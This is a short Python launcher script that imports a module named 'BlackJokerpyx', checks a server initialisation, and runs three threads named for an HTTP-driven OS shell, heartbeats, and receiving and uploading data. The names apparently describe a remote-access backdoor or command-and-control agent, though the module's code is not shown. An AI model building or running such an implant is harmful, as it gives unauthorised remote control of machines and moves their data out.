import BlackJokerpyx # type: ignore
import threading

if __name__ == "__main__":
    if BlackJokerpyx.init_server():
        # 启动线程
        threads = [
            threading.Thread(target=BlackJokerpyx.shell_os_http),
            threading.Thread(target=BlackJokerpyx.heartbeat_http),
            threading.Thread(target=BlackJokerpyx.heartbeat_receive_and_upload)
        ]
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join()